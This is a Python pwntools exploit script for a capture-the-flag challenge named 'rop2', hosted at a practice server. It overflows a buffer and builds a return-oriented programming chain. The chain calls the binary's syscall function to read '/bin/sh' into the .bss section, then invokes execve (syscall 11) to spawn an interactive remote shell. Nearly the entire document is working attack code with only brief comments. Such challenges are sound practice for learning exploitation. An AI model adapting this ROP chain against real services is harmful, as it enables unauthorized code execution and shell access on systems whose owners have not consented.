#!/usr/bin/env python
# encoding: utf-8

# syscall(4) -> write
# syscall(3) -> read and the argvs are as following
# execv(/bin/sh) <- syscall(11,binsh,0,0)
from pwn import *
context.log_level = 'debug'
# io = process('./rop2')
io = remote('hackme.inndy.tw', 7703)
elf = ELF('./rop2')

bss = elf.bss()
sys = elf.symbols['syscall']
main = elf.sym['main']

# call read to rean /bin/sh to bss
payload = 'a' * 12 + 'b' * 4
payload += p32(sys) + p32(main) + p32(3) + p32(0) + p32(bss) + p32(100)
io.recvuntil('chain:')
io.send(payload)

io.send('/bin/sh' + '\x00')

payload = 'a' * 12 + 'b' * 4
payload += p32(sys) + 'bgo!' + p32(11) + p32(bss) + p32(0) + p32(0)

io.recvuntil('chain:')
io.send(payload)

io.interactive()
io.close()


